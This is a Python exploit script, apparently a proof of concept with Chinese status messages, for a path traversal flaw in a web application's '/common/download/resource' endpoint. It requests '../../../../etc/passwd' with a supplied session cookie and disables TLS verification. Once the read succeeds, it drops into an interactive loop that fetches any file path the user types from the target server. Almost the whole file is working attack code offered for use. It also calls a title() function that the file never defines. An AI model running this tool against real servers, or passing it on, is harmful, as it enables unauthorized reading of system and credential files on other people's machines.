import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def POC_1(target_url, Cookie):
    vuln_url = target_url + "/common/download/resource?resource=/profile/../../../../etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":Cookie
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m 正在请求 {}//common/download/resource?resource=/profile/../../../../etc/passwd \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m 目标 {}存在漏洞 ,成功读取 /etc/passwd \033[0m".format(target_url))
            print("\033[32m 响应为:\n{} \033[0m".format(response.text))
            while True:
                Filename = input("\033[35mFile >>> \033[0m")
                if Filename == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, Cookie, Filename)
        else:
            print("\033[31m 请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m 请求失败 \033[0m", e)

def POC_2(target_url, Cookie, Filename):
    vuln_url = target_url + "/common/download/resource?resource=/profile/../../../../{}".format(Filename)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":Cookie
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m 响应为:\n{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    Cookie = str(input("\033[35mCookie >>> \033[0m"))
    POC_1(target_url, Cookie)